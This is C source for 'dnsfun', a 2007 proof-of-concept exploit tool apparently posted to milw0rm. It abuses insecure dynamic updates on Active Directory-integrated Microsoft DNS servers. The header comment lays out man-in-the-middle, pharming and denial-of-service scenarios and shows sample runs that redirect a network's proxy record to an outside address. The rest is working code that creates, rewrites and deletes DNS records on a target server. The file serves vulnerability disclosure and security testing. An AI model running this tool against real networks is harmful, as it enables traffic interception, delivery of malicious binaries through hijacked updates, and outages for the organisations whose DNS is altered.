/*
Exploiting Microsoft DNS Dynamic Updates for Fun and profit
Andres Tarasco Acuña  - (c) 2007 
Url: http://www.514.es
  

By default, most Microsoft DNS servers integrated with active directory allow
insecure dynamic updates for dns records.
This feature allows remote users to create, change and delete DNS records.
There are several attack scenarios:

+ MITM attacks: Changing dns records for the network proxy and relay HTTP queries. 
  This attack vector is the most reliable and also allows us to exploit automatic 
  updates for most Windows software, by deploying custom binaries to the client.

 + Denial of service: by deleting / changing critical dns records

 + Pharming: like mitm attacks, poisoning several dns records.

dnsfun exploits that weak configuration and allows remote users to modify dns records.
Here are some examples of what can be done. Example:


D:\DNSfun>ping -n 1 FakeProxy.fooooo.com
Haciendo ping a FakeProxy.fooooo.com [66.6.66.6] con 32 bytes de datos:
      
D:\DNSfun>dnsfun.exe -s 10.100.1.1 -q  proxy.mydomain -u 66.6.66.6
Microsoft Dynamic DNS Updates - Proof of Concept
http://www.514.es - (c) 2007 Andres Tarasco Acuña
      
 [+] Trying to resolve Host: proxy.mydomain (Dns Server 10.100.1.1)
 [+] Host proxy.mydomain resolved as 192.168.1.200
 [+] Trying to set ip address of the host proxy.mydomain to 66.6.66.6
 [+] Trying Nonsecure Dynamic Update...
 [?] Host Updated. Checking...(0)
 [+] Host proxy.mydomain resolved as 66.6.66.6

D:\DNSfun>dnsfun.exe -s 10.100.1.1 -cc atarasco.mydomain.com -u www.514.es
 Microsoft Dynamic DNS Updates - Proof of Concept
 http://www.514.es - (c) 2007 Andres Tarasco Acuña

[+] Gathering Credentials..
[+] Creating DNS CName Record for atarasco.mydomain.com (www.514.es)
[+] Host Created. Rechecking Record...
[+] Host atarasco.mydomain.com resolved as CNAME www.514.es

This isn't a new vulnerability but AFAIK those attack vectors were never exploited.

Check the usage function for more information

*/
#include <stdio.h>
#include <winsock2.h>
#include <Windns.h>
#pragma comment(lib,"Dnsapi.lib")
#pragma comment(lib, "ws2_32.lib")

char TargetDnsServer[256]=""; // -s
char TargetDnsRecord[256]=""; // -q
char NewIpAddress[256]="";    // -i 
char DeleteDnsRecord[256]=""; //-d 
char CreateDnsRecord[256]="";

WORD CreationType=DNS_TYPE_A;

#define DELETERECORD   (DeleteDnsRecord[0]!='\0')
#define UPDATERECORD ( (TargetDnsRecord[0]!='\0') && (NewIpAddress[0]!='\0') )
#define CREATERECORD ( (CreateDnsRecord[0]!='\0') && (NewIpAddress[0]!='\0') )
#define QUERYRECORD    (TargetDnsRecord[0]!='\0')
#define _DBG_
#undef _DBG_

void usage(char *argv[]);


DNS_RECORDA *DnsQueryA(char *name,IP4_ARRAY *servers) 
{
   
   DNS_STATUS status;
   WORD type= DNS_TYPE_ANY;
   DWORD fOptions=DNS_QUERY_BYPASS_CACHE | DNS_QUERY_NO_LOCAL_NAME |DNS_QUERY_NO_HOSTS_FILE | DNS_QUERY_NO_NETBT | DNS_QUERY_TREAT_AS_FQDN;
   PVOID* reserved=NULL;
   DNS_RECORDA *records=(PDNS_RECORDA)malloc(sizeof(DNS_RECORDA));
   DNS_RECORDA *result;
   IN_ADDR ipaddr;
   int i;
   int count=0;        
   
   if (!name) {
      return (NULL);
   } else {
      memset(records,'\0',sizeof(DNS_RECORDA));
      status = DnsQuery_A( name,          //PCWSTR pszName,
         type,          //WORD wType,
         fOptions,      //DWORD fOptions,
         servers,       //PIP4_ARRAY aipServers,
         (DNS_RECORDA**)&records,    //PDNS_RECORD* ppQueryResultsSet,
         reserved ); //PVOID* pReserved
      
      if (status == ERROR_SUCCESS)
      {
         fflush(stdout);
         result=records;
         do {
#ifdef _DBG_    
            printf("[+] Record %i---\n",count);
            count++;
            printf("[+] DNS  wDataLength %i\n",result->wDataLength);
            printf("[+] DNS Flags DW: %x\n",result->Flags.DW);
            printf("[+] DNS Flags S.Section: %x\n",result->Flags.S.Section);
            printf("[+] DNS Flags S.Delete: %x\n",result->Flags.S.Delete);
            printf("[+] DNS Flags S.CharSet: %x\n",result->Flags.S.CharSet);
            printf("[+] DNS Flags S.Unused: %x\n",result->Flags.S.Unused);
            printf("[+] DNS Flags S.Reserved: %x\n",result->Flags.S.Reserved);
#endif
            switch (result->wType) {
            case DNS_TYPE_A:
               ipaddr.S_un.S_addr = (result->Data.A.IpAddress);
               printf("[+] Host %s resolved as %s\n", result->pName,inet_ntoa(ipaddr));
               break;
            case DNS_TYPE_NS:
               printf("[+] Domain %s Dns Servers: %s\n",result->pName,result->Data.Ns.pNameHost);
               break;
            case DNS_TYPE_CNAME:
               printf("[+] Host %s resolved as CNAME %s\n", result->pName,result->Data.Cname.pNameHost);
               //DnsQueryA(result->Data.Cname.pNameHost,servers);
               break;
               
            case DNS_TYPE_SOA:
               printf("[+] SOA Information: PrimaryServer: %s\n",result->Data.Soa.pNamePrimaryServer);
               printf("[+] SOA Information: Administrator: %s\n",result->Data.Soa.pNameAdministrator);
               printf("[+] SOA Information: SerialNo %x - Refresh %i - retry %i - Expire %i - DefaultTld %i\n",
                  result->Data.Soa.dwSerialNo,
                  result->Data.Soa.dwRefresh,
                  result->Data.Soa.dwRetry,
                  result->Data.Soa.dwExpire,
                  result->Data.Soa.dwDefaultTtl);
               break;
               
            case DNS_TYPE_MX:
               printf("[+] %s MX Server resolved as %s (Preference %i)\n", result->pName,result->Data.Mx.pNameExchange, result->Data.Mx.wPreference);
               break;

            case DNS_TYPE_TEXT:
               printf("[+] Text: %i bytes\n",result->Data.Txt.dwStringCount); //:?
               break;

            case DNS_TYPE_SRV:
               printf("[+] SRV Record. NameTarget %s ",result->Data.Srv.pNameTarget);
               printf("(Priority %i - Port %i - Weigth: %i)\n",result->Data.Srv.wPriority,result->Data.Srv.wPort,result->Data.Srv.wWeight);
               //printf("[+] Resource Pad %i \n",result->Data.Srv.Pad);
               break;
               
            default:
               printf("[-] DnsQuery returned unknown wtype %x\n",result->wType);
               break;
            }
            result=result->pNext;
         } while (result!=NULL);
      } else {
         if (status==9003) printf("[-] Record not found\n");
         else printf("[-] Query Error: %i - %i\n",status,GetLastError());
         exit(-1);
      }
   }
   return records;
}
/***********************************************************************************************/
int main(int argc, char *argv[]) {
   
   HANDLE creds;
   DNS_RECORDA *result;
   DNS_STATUS status;
   
   HANDLE ContextHandle;
   DWORD Options=DNS_UPDATE_SECURITY_ON;
   PVOID pReserved=NULL;
   IN_ADDR ipaddr;
   IP4_ARRAY *servers=NULL;
   SEC_WINNT_AUTH_IDENTITY_A *Credentials=NULL;
   WORD i;
      
   printf(" Microsoft Dynamic DNS Updates - Proof of Concept\n");
   printf(" http://www.514.es - (c) 2007 Andres Tarasco Acuña\n\n");
   if (argc==1) usage(argv);
      
   //Init Credentials Struct
   Credentials = (SEC_WINNT_AUTH_IDENTITY_A *)malloc(sizeof(SEC_WINNT_AUTH_IDENTITY_A));
   memset(Credentials,'\0',sizeof(SEC_WINNT_AUTH_IDENTITY_A));
   Credentials->Flags=SEC_WINNT_AUTH_IDENTITY_ANSI;   
   for(i=1;i<argc;i++) {
      if ( (argv[i][0]=='-') ) {
         switch (argv[i][1]) {
         case 's':
         case 'S':
            strcpy(TargetDnsServer,argv[i+1]);
            servers=(PIP4_ARRAY)malloc(sizeof(IP4_ARRAY));
            servers->AddrCount=1;
            servers->AddrArray[0]=inet_addr(TargetDnsServer);
            break;
         case 'D':
         case 'd':
            strcpy(DeleteDnsRecord,argv[i+1]);
            break;                    
         case 'q':
         case 'Q':
            strcpy(TargetDnsRecord,argv[i+1]);
            break;
         case 'u':
         case 'U':
            strcpy(NewIpAddress,argv[i+1]);
            break;
         case 'c':
         case 'C':
            strcpy(CreateDnsRecord,argv[i+1]);
            if (NewIpAddress[0]=='\0') strcpy(NewIpAddress,"127.0.0.1");
            if (argv[i][2]!='\0') {
               switch (argv[i][2]) {
               case 'c': CreationType=DNS_TYPE_CNAME;
                  break;
               case 'a': CreationType=DNS_TYPE_A;
                  break;
               }
            }
            break;           
            /*
            case 'f':
               CreateThread( NULL,0,HttpRelayToProxy,(LPVOID) &i,0,&dwThreadId);
               break;
            case 'au': //Uauthorization serName
            Credentials->User=argv[i+1]; Credentials->UserLength=strlen(argv[i+1]);   break;
            case 'ap':
            Credentials->Password=argv[i+1];Credentials->PasswordLength=strlen(argv[i+1]); break;
            case 'ad':
            Credentials->Domain=argv[i+1]; Credentials->DomainLength=strlen(argv[i+1]);  break;     
            */
         default:
            printf("[-] Invalid argument: %s\n",argv[i]);
            usage(argv);
            break;
         }
         i++;            
      } else usage(argv);
   }
   
   printf("[+] Gathering Credentials..\n");
   //http://msdn2.microsoft.com/en-us/library/ms682007.aspx
   if (Credentials->UserLength==0) {
      status=DnsAcquireContextHandle(FALSE,NULL,&ContextHandle); //Context with default Credentials
   } else {
      status=DnsAcquireContextHandle(FALSE,Credentials,&ContextHandle); //Context with Custom Credentials
   }
   
   if (status == ERROR_SUCCESS) {          
      if (CREATERECORD) {
         
         result=(PDNS_RECORDA)malloc(sizeof(DNS_RECORDA));
         memset(result,'\0',sizeof(DNS_RECORDA));
         result->wType=CreationType; //DNS_TYPE_A by default
         if (CreationType==DNS_TYPE_CNAME) {
            printf("[+] Creating DNS CName Record for %s (%s)\n",CreateDnsRecord,NewIpAddress);
            result->Data.Cname.pNameHost=NewIpAddress;
         } else {
            printf("[+] Creating DNS A Record for %s (%s)\n",CreateDnsRecord,NewIpAddress);
            result->Data.A.IpAddress=inet_addr(NewIpAddress);
         } 
         result->pName=CreateDnsRecord;
         result->wDataLength=4;
         result->Flags.S.Section=1;
         result->Flags.S.CharSet=DnsCharSetAnsi;
         result->pNext=NULL;       

         status=DnsModifyRecordsInSet_A(result,  //add record
            NULL, //delete record
            Options,
            ContextHandle,
            servers,
            NULL);
         if (status ==ERROR_SUCCESS) {
            printf("[+] Host Created. Rechecking Record...\n");
            DnsRecordListFree(result,DnsFreeRecordList);
            result=DnsQueryA(CreateDnsRecord,servers);
         } else {
            printf("[-] Error: Unable to create  %s (%i)\n",CreateDnsRecord,status);
         }      
      } else if (DELETERECORD) {         
         printf("[+] Trying to resolve Host: %s before deleting\n",DeleteDnsRecord);
         result=DnsQueryA(DeleteDnsRecord,servers);
         if (result!=NULL) {
            printf("[+] Trying to Delete Record. Are You Sure? (Y/N)...");
            i=getchar(); if (i!='y') return(-1);
            printf("[+] Deleting record %s\n",DeleteDnsRecord);   
            status=DnsModifyRecordsInSet_A(NULL,  //add record
               result, //delete record
               Options,
               ContextHandle,
               servers,
               NULL);      
            if (status ==ERROR_SUCCESS) {
               printf("[+] Host Deleted. Rechecking Record %s...\n",DeleteDnsRecord);
               DnsRecordListFree(result,DnsFreeRecordList);
               result=DnsQueryA(DeleteDnsRecord,servers);
            } else {
               printf("[-] Error: Unable to Delete %s\n",DeleteDnsRecord);
            }
         } else {
            printf("[-] Host %s not found\n",DeleteDnsRecord);
         }

      } else if (UPDATERECORD) {
         //         exit(1);
         printf("[+] Trying to resolve Host: %s before updating\n",TargetDnsRecord);
         result=DnsQueryA(TargetDnsRecord,servers);
         if (result->wType==DNS_TYPE_A ) {
            printf("[+] Trying to update record. Are You Sure? (Y/N)...");
            i=getchar(); if (i!='y') return(-1);
            result->Data.A.IpAddress=inet_addr(NewIpAddress);//Modify Dns record
            ipaddr.S_un.S_addr = (result->Data.A.IpAddress);
            printf("[+] Trying to set ip address of the host %s to %s \n", TargetDnsRecord,NewIpAddress);//inet_ntoa(ipaddr));
            printf("[+] Trying to Modify Record...\n");
            status=DnsReplaceRecordSetA(result,
               Options, //Attempts nonsecure dynamic update. If refused, then attempts secure dynamic update.
               ContextHandle,
               servers,//pServerList,
               NULL);//pReserved
            if (status ==ERROR_SUCCESS) {
               printf("[+] Host Updated. Rechecking Record...\n");
               DnsRecordListFree(result,DnsFreeRecordList);
               result=DnsQueryA(TargetDnsRecord,servers);
            } else {
               printf("[-] Error: Unable to Delete %s\n",TargetDnsRecord);
            }

         } else {
            printf("[-] Unable to Update Record (Type %x)\n",result->wType);
            }
      } else if (QUERYRECORD) {
         printf("[+] Query Information for host %s...\n",TargetDnsRecord);
         result=DnsQueryA(TargetDnsRecord,servers);
         DnsRecordListFree(result,DnsFreeRecordList);         
      } else {
         printf("[-] Unknown Options\n");
         return(-1);
      }           
   } else {
      printf("[-] Error Calling DnsAcquireContextHandle\n");   
   }
   return (1);
}

/****************************************************************************/
void usage(char *argv[]) {  
   printf(" Usage:\n");
   printf("\t%s\t -[s]d|c|q[u] <options>\n",argv[0]);
   printf(" Details:\n");   
   printf("\t%s\t -s  ip        (dns Server (optional))\n",argv[0]);
   printf("\t%s\t -d  fqdn      (Delete dns record)\n",argv[0]);
   printf("\t%s\t -q  fqdn      (Query  dns record)\n",argv[0]);
   printf("\t%s\t -c[a|c] ip    (Create A or CName record (default A))\n",argv[0]);
   printf("\t%s\t -u  ip|fqdn   (Update dns record (requires -q or -c))\n",argv[0]);     
   printf("\n Examples:\n");
   printf("\t%s -s 10.0.0.1 -q proxy.mydomain.com -u 5.1.4.77 (Updates record)\n",argv[0]);
   printf("\t%s -s 10.0.0.1 -d foo.mydomain.com      (delete foo.mydomain.com record)\n",argv[0]);
   printf("\t%s -s 10.0.0.1 -c atarasco.foo.mydomain.com -u 5.14.7.7 (creates record)\n",argv[0]);
   printf("\t%s -s 10.0.0.1 -cc www.atarasco.foo.mydomain.com -u 5.14.7.7 (creates record)\n",argv[0]);
   printf("\t%s -s 10.0.0.1 -q _ldap._tcp.mydomain             (Query for srv record)\n",argv[0]);
   exit(0);
}
/****************************************************************************/

// milw0rm.com [2007-03-22]